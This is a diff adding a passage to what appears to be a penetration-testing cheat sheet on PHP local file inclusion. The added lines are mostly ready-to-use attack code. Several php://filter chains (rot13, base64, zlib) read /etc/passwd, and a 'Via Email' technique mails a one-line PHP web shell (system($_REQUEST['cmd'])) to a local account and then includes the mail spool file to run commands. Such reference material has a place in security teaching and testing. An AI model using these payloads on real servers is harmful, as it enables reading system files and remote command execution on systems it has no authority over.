@@ -179,3 +179,33 @@ Running in php var_dump(stream_get_filters()); you can find a couple of unexpect
     - dechunk: reverses HTTP chunked encoding
     - convert.*
 
+```
+# String Filters
+## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
+echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
+## Same chain without the "|" char
+echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
+## string.string_tags example
+echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");
+
+# Conversion filter
+## B64 decode
+echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
+## Chain B64 encode and decode
+echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
+## convert.quoted-printable-encode example
+echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
+=C2=A3hellooo=3D
+## convert.iconv.utf-8.utf-16le
+echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");
+
+# Compresion Filter
+## Compress + B64
+echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
+readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
+# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
+```
+### Via Email
+Send a mail to a internal account (user@localhost) containing your PHP payload like <?php echo system($_REQUEST["cmd"]); ?> and try to include to the mail of the user with a path like /var/mail/<USERNAME> or /var/spool/mail/<USERNAME>
+
+
